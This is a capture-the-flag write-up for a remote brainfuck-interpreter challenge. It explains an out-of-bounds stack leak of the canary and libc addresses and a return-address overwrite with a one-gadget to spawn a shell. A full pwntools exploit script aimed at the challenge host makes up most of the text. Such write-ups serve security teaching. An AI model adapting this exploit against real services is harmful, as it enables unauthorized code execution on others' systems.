​Hi, the goal of this challenge it to exploit a brainfuck interpreter remotely. the binary of the interpreter is provided.

the program allocate some buffers on stack:

    3 dwords, for the ptr var, jump addr, and pc
    followed by 30000 bytes of memory
    followed by 1004 bytes of program memory
    followed by the canary (8 bytes)
    followed by libcsu_init address in program (8 bytes)
    followed by _libc_start_main return address in libc (8 bytes)

the brainfuck interpreter moves the ptr register from beginning of the 30000bytes buffer, with no limit checking.. 
* "," --> we can do ptr = getchar(), to read a char from stdin to actual pointer,
* "." --> or putchar(ptr) , dump char stored at actual pointer 
* ">" & "<" -->  increment and decrement pointer 
* "+" & "-" --> increment and decrement pointer content 
* "[" & "]" --> and do some loops..

so the exploitation goes like this, we send enough chars, to reach canary address with ptr, then we dump canary, _libcsu_init addr, and _libc_start_main return address.. this is our leaks..

we identify first libc version with the libc leak address, we identify libc6_2.28-10_amd64.so as the libc used.

then we calculate libc_base with our libc leak, then we calculate onegadget address with it. and we just rewrite the _libc_start_main return address with the onegadget address..

then, when the program returns from main...we got Shell..

```python
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
from pwn import *
context(arch = 'amd64', os = 'linux')
context.log_level = 'info'

#binary name
challenge_exe = './bflol'

#setting
con_host = 'chal.cybersecurityrumble.de'
con_port = 19783

p = connect(con_host, con_port)

command = ',[>,]>.[>.]>>.[>.]>><<<<<<<<,>,>,>,>,>,>'

p.sendline(command)

payload = ']'*30000
payload += command
payload += (1004-len(command))*']' + '\x00'


p.send(payload)

buff = p.recv(1)
buff += p.recv()

# we dump the canary (even if we don't need it)
canary = u64('\x00'+buff[0:7])
info("canary = "+hex(canary))
# we dump a program address (even if we don't need it)
leak1 = u64(buff[8:14]+'\x00\x00')
info("leak prog = "+hex(leak1))
# we dump a libc_start_main return address (this one we need it)
libc_leak = u64(buff[14:20]+'\x00\x00')
info("leak libc = "+hex(libc_leak))

# libc_start_main return address offset for libc_base
retoffset = 0x02409b
# we calculate libc_base with our libc leak
libc_base = libc_leak - retoffset
info("base libc = "+hex(libc_base))

# the one gadget we will use
onegadget = libc_base + 0x4484f

info("onegadget = "+hex(onegadget))
info("sending one gadget (good luck)")

payload2 = struct.pack('<Q', onegadget)
p.send(payload2[0:6])

p.interactive()
```

around 2020 nobodyisnobody still pwning...


